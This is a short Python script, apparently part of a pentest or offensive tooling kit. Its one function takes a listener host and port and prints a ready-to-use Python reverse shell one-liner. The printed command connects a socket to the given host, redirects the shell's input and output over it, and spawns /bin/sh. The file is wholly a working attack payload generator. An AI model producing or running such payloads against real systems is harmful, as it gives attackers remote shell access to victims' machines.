from rich.console import Console
def generate_payloads(lhost, lport):
    console = Console()
    console.print(f"\n[bold yellow][*] Python Reverse Shell Payload (LHOST: {lhost}, LPORT: {lport}):[/bold yellow]")
    payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
    console.print(f"[bold green]{payload}[/bold green]\n")
